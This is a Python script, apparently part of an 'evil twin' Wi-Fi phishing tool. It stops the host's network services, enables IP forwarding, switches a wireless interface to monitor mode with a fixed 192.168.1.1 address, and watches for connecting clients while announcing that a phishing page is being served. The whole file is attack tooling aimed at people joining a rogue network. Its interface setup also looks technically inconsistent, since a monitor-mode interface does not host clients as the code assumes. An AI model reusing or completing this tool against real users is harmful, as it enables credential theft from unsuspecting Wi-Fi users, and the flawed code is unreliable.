#!/usr/bin/env python3

import sys
import time
import subprocess

from colorama import Style, Fore

CLIENT_CONNECTED = False


def stop_network_services():
    try:
        subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
        subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=True)
        print("[✔] Stopped network services")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error stopping network services: {e}")
        sys.exit(1)


def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print("[✔] Enabled IP forwarding")
    except IOError as e:
        print(f"[-] Error enabling IP forwarding: {e}")
        sys.exit(1)


def setup_interface(interface):
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iw", "dev", interface, "set", "type", "monitor"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        subprocess.run(["ip", "addr", "add", "192.168.1.1/24", "dev", interface], check=True)
        print(f"[✔] Configured interface {interface}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error configuring interface: {e}")
        sys.exit(1)


def monitor_clients(interface):
    global CLIENT_CONNECTED
    while True:
        result = subprocess.run(["iw", "dev", interface, "station", "dump"], capture_output=True, text=True)
        if "Station" in result.stdout:
            if not CLIENT_CONNECTED:
                print(Fore.GREEN + "\n ⬤ Client connected! Phishing page is being served" + Style.RESET_ALL)
                CLIENT_CONNECTED = True
        else:
            if CLIENT_CONNECTED:
                print(Fore.RED + "\n ⬤ Client disconnected!" + Style.RESET_ALL)
            CLIENT_CONNECTED = False
        time.sleep(2)
